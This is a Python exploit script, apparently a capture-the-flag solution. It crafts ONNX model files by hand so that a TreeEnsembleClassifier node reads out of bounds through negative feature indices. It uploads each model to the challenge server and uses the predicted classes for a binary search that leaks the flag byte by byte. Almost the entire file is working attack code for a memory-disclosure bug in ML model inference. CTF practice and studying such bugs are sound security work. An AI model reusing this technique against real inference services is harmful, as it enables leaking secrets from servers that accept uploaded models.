import struct
import requests
import time
import sys

def encode_varint(val):
    if val < 0:
        val = (1 << 64) + val
    res = bytearray()
    while True:
        b = val & 0x7f
        val >>= 7
        if val:
            res.append(b | 0x80)
        else:
            res.append(b)
            break
    return bytes(res)

def encode_field(field_num, wire_type, data):
    key = (field_num << 3) | wire_type
    key_bytes = encode_varint(key)
    if wire_type == 0:
        return key_bytes + encode_varint(data)
    elif wire_type == 1:
        return key_bytes + data
    elif wire_type == 2:
        return key_bytes + encode_varint(len(data)) + data
    elif wire_type == 5:
        return key_bytes + data
    else:
        raise ValueError(f"Unsupported wire type {wire_type}")

def make_attr_string(name, s_val):
    content = encode_field(1, 2, name.encode('utf-8'))
    content += encode_field(4, 2, s_val if isinstance(s_val, bytes) else s_val.encode('utf-8'))
    content += encode_field(20, 0, 3)
    return encode_field(5, 2, content)

def make_attr_strings(name, s_list):
    content = encode_field(1, 2, name.encode('utf-8'))
    for s in s_list:
        content += encode_field(9, 2, s if isinstance(s, bytes) else s.encode('utf-8'))
    content += encode_field(20, 0, 8)
    return encode_field(5, 2, content)

def make_attr_ints(name, ints_list):
    content = encode_field(1, 2, name.encode('utf-8'))
    for i in ints_list:
        content += encode_field(8, 0, i)
    content += encode_field(20, 0, 7)
    return encode_field(5, 2, content)

def make_attr_floats(name, floats_list):
    content = encode_field(1, 2, name.encode('utf-8'))
    for f in floats_list:
        content += encode_field(7, 5, struct.pack('<f', f))
    content += encode_field(20, 0, 6)
    return encode_field(5, 2, content)

def parse_protobuf(data):
    idx = 0
    fields = []
    while idx < len(data):
        key, shift = 0, 0
        while True:
            if idx >= len(data): break
            b = data[idx]
            idx += 1
            key |= (b & 0x7f) << shift
            if not (b & 0x80): break
            shift += 7
        if idx > len(data): break
        field_num = key >> 3
        wire_type = key & 0x7
        if wire_type == 0:
            val, shift = 0, 0
            while True:
                b = data[idx]
                idx += 1
                val |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            fields.append((field_num, wire_type, val))
        elif wire_type == 1:
            val = data[idx:idx+8]
            idx += 8
            fields.append((field_num, wire_type, val))
        elif wire_type == 2:
            length, shift = 0, 0
            while True:
                b = data[idx]
                idx += 1
                length |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            val = data[idx:idx+length]
            idx += length
            fields.append((field_num, wire_type, val))
        elif wire_type == 5:
            val = data[idx:idx+4]
            idx += 4
            fields.append((field_num, wire_type, val))
        else:
            raise ValueError(f"Unknown wire type {wire_type} at {idx}")
    return fields

def serialize_protobuf(fields):
    res = bytearray()
    for field_num, wire_type, val in fields:
        if wire_type == 0:
            res += encode_field(field_num, 0, val)
        elif wire_type == 1:
            res += encode_field(field_num, 1, val)
        elif wire_type == 2:
            res += encode_field(field_num, 2, val)
        elif wire_type == 5:
            res += encode_field(field_num, 5, val)
    return bytes(res)

with open('sample.onnx', 'rb') as f:
    SAMPLE_ONNX_RAW = f.read()

def create_model_from_sample(nodes, leaves, n_classes=8):
    model_fields = parse_protobuf(SAMPLE_ONNX_RAW)
    
    all_nodes = list(nodes)
    for leaf in leaves:
        all_nodes.append({
            'tree_id': leaf['tree_id'],
            'node_id': leaf['node_id'],
            'feature_id': 0,
            'value': 0.0,
            'mode': 'LEAF',
            'true_id': 0,
            'false_id': 0,
        })
    all_nodes.sort(key=lambda x: (x['tree_id'], x['node_id']))
    
    nodes_treeids = [n['tree_id'] for n in all_nodes]
    nodes_nodeids = [n['node_id'] for n in all_nodes]
    nodes_featureids = [n['feature_id'] for n in all_nodes]
    nodes_values = [n['value'] for n in all_nodes]
    nodes_hitrates = [1.0 for _ in all_nodes]
    nodes_modes = [n['mode'] for n in all_nodes]
    nodes_truenodeids = [n['true_id'] for n in all_nodes]
    nodes_falsenodeids = [n['false_id'] for n in all_nodes]
    nodes_missing = [0 for _ in all_nodes]
    
    class_treeids = [l['tree_id'] for l in leaves]
    class_nodeids = [l['node_id'] for l in leaves]
    class_ids = [l['class_id'] for l in leaves]
    class_weights = [l['weight'] for l in leaves]
    classlabels = list(range(n_classes))
    
    graph_idx = [i for i, f in enumerate(model_fields) if f[0] == 7][0]
    graph_raw = model_fields[graph_idx][2]
    graph_fields = parse_protobuf(graph_raw)
    
    new_graph_fields = []
    for f in graph_fields:
        if f[0] == 1:
            node_fields = parse_protobuf(f[2])
            op_type = [nf[2].decode('latin1') for nf in node_fields if nf[0] == 4][0]
            if op_type == 'TreeEnsembleClassifier':
                new_node_content = bytearray()
                new_node_content += encode_field(1, 2, b'X')
                new_node_content += encode_field(2, 2, b'label')
                new_node_content += encode_field(2, 2, b'probabilities')
                new_node_content += encode_field(3, 2, b'TreeEnsembleClassifier')
                new_node_content += encode_field(4, 2, b'TreeEnsembleClassifier')
                new_node_content += encode_field(7, 2, b'ai.onnx.ml')
                
                new_node_content += make_attr_ints('class_ids', class_ids)
                new_node_content += make_attr_ints('class_nodeids', class_nodeids)
                new_node_content += make_attr_ints('class_treeids', class_treeids)
                new_node_content += make_attr_floats('class_weights', class_weights)
                new_node_content += make_attr_ints('classlabels_int64s', classlabels)
                new_node_content += make_attr_ints('nodes_falsenodeids', nodes_falsenodeids)
                new_node_content += make_attr_ints('nodes_featureids', nodes_featureids)
                new_node_content += make_attr_floats('nodes_hitrates', nodes_hitrates)
                new_node_content += make_attr_ints('nodes_missing_value_tracks_true', nodes_missing)
                new_node_content += make_attr_strings('nodes_modes', nodes_modes)
                new_node_content += make_attr_ints('nodes_nodeids', nodes_nodeids)
                new_node_content += make_attr_ints('nodes_treeids', nodes_treeids)
                new_node_content += make_attr_ints('nodes_truenodeids', nodes_truenodeids)
                new_node_content += make_attr_floats('nodes_values', nodes_values)
                new_node_content += make_attr_string('post_transform', 'NONE')
                
                new_graph_fields.append((1, 2, bytes(new_node_content)))
            elif op_type == 'ZipMap':
                zm_node_content = bytearray()
                zm_node_content += encode_field(1, 2, b'probabilities')
                zm_node_content += encode_field(2, 2, b'output_probability')
                zm_node_content += encode_field(3, 2, b'ZipMap')
                zm_node_content += encode_field(4, 2, b'ZipMap')
                zm_node_content += encode_field(7, 2, b'ai.onnx.ml')
                zm_node_content += make_attr_ints('classlabels_int64s', classlabels)
                new_graph_fields.append((1, 2, bytes(zm_node_content)))
            else:
                new_graph_fields.append(f)
        else:
            new_graph_fields.append(f)
            
    new_graph_raw = serialize_protobuf(new_graph_fields)
    new_model_fields = []
    for f in model_fields:
        if f[0] == 7:
            new_model_fields.append((7, 2, new_graph_raw))
        else:
            new_model_fields.append(f)
            
    return serialize_protobuf(new_model_fields)

BASE_URL = 'https://1db596226dd7490bafeb.kit.sasc.tf'
session = requests.Session()

def get_session():
    global session
    return session

def reset_session():
    global session
    session = requests.Session()
    return session

def u32_to_f32(u):
    return struct.unpack('<f', struct.pack('<I', u))[0]

def f32_to_u32(f):
    return struct.unpack('<I', struct.pack('<f', f))[0]

def query_interval_8(feature_id, thresholds):
    t0, t1, t2, t3, t4, t5, t6 = thresholds
    nodes = [
        {'tree_id': 0, 'node_id': 0, 'feature_id': feature_id, 'value': t3, 'mode': 'BRANCH_LEQ', 'true_id': 1, 'false_id': 4},
        {'tree_id': 0, 'node_id': 1, 'feature_id': feature_id, 'value': t1, 'mode': 'BRANCH_LEQ', 'true_id': 2, 'false_id': 3},
        {'tree_id': 0, 'node_id': 2, 'feature_id': feature_id, 'value': t0, 'mode': 'BRANCH_LEQ', 'true_id': 7, 'false_id': 8},
        {'tree_id': 0, 'node_id': 3, 'feature_id': feature_id, 'value': t2, 'mode': 'BRANCH_LEQ', 'true_id': 9, 'false_id': 10},
        {'tree_id': 0, 'node_id': 4, 'feature_id': feature_id, 'value': t5, 'mode': 'BRANCH_LEQ', 'true_id': 5, 'false_id': 6},
        {'tree_id': 0, 'node_id': 5, 'feature_id': feature_id, 'value': t4, 'mode': 'BRANCH_LEQ', 'true_id': 11, 'false_id': 12},
        {'tree_id': 0, 'node_id': 6, 'feature_id': feature_id, 'value': t6, 'mode': 'BRANCH_LEQ', 'true_id': 13, 'false_id': 14},
    ]
    leaves = [
        {'tree_id': 0, 'node_id': 7, 'class_id': 0, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 8, 'class_id': 1, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 9, 'class_id': 2, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 10, 'class_id': 3, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 11, 'class_id': 4, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 12, 'class_id': 5, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 13, 'class_id': 6, 'weight': 1.0},
        {'tree_id': 0, 'node_id': 14, 'class_id': 7, 'weight': 1.0},
    ]
    
    onnx_data = create_model_from_sample(nodes, leaves, n_classes=8)
    for attempt in range(8):
        try:
            s = get_session()
            r = s.post(f'{BASE_URL}/upload',
                       files={'file': ('model.onnx', onnx_data, 'application/octet-stream')},
                       timeout=15)
            if r.status_code != 200:
                raise RuntimeError(f"Upload failed: {r.status_code} {r.text}")
            cd = r.headers.get('Content-Disposition')
            filename = cd.split('filename=')[1].strip('"\'')
            r2 = s.get(f'{BASE_URL}/{filename}', timeout=15)
            text = r2.text.strip()
            cls = int(text.split('Predicted Class: ')[1].split()[0])
            return cls
        except Exception as e:
            print(f"  [Retry {attempt+1}] Error: {e}", flush=True)
            reset_session()
            time.sleep(1)
    raise RuntimeError("Max retries exceeded")

def binary_search_chunk(feature_id):
    low = 0
    high = 0x7f7fffff
    
    step = 0
    while low < high:
        step += 1
        diff = (high - low) // 8
        if diff == 0:
            mid = (low + high) // 2
            t_f = u32_to_f32(mid)
            thresholds = [t_f] * 7
            cls = query_interval_8(feature_id, thresholds)
            if cls == 0:
                high = mid
            else:
                low = mid + 1
            print(f"  Step {step} (binary): range [{hex(low)}, {hex(high)}]", flush=True)
            continue
            
        t0 = low + diff
        t1 = low + 2 * diff
        t2 = low + 3 * diff
        t3 = low + 4 * diff
        t4 = low + 5 * diff
        t5 = low + 6 * diff
        t6 = low + 7 * diff
        
        thresholds = [u32_to_f32(t) for t in [t0, t1, t2, t3, t4, t5, t6]]
        cls = query_interval_8(feature_id, thresholds)
        
        if cls == 0:
            high = t0
        elif cls == 1:
            low = t0 + 1
            high = t1
        elif cls == 2:
            low = t1 + 1
            high = t2
        elif cls == 3:
            low = t2 + 1
            high = t3
        elif cls == 4:
            low = t3 + 1
            high = t4
        elif cls == 5:
            low = t4 + 1
            high = t5
        elif cls == 6:
            low = t5 + 1
            high = t6
        elif cls == 7:
            low = t6 + 1
            
        curr_bytes = struct.pack('<I', low)
        print(f"  Step {step}: class={cls} -> range [{hex(low)}, {hex(high)}], bytes={repr(curr_bytes)}", flush=True)
        
    res_bytes = struct.pack('<I', low)
    print(f"Result for feature {feature_id}: {hex(low)} -> {repr(res_bytes)}", flush=True)
    return res_bytes

if __name__ == '__main__':
    flag_bytes = b''
    print("Starting full flag extraction (feature_id = -20 to -9)...", flush=True)
    for feat in range(-20, -8):
        print(f"\n=== Extracting Chunk {feat} (offset {(feat+20)*4}) ===", flush=True)
        chunk = binary_search_chunk(feat)
        flag_bytes += chunk
        print(f"Current flag so far: {repr(flag_bytes)}", flush=True)
        with open('flag.txt', 'wb') as f:
            f.write(flag_bytes)
        if b'}' in chunk or b'\x00' in chunk:
            print("\nFound end of flag! Finished extraction!", flush=True)
            break
    print(f"\n==========================================", flush=True)
    clean_flag = flag_bytes.split(b'\x00')[0].decode('latin1', errors='replace')
    print(f"FLAG: {clean_flag}", flush=True)
    print(f"==========================================", flush=True)
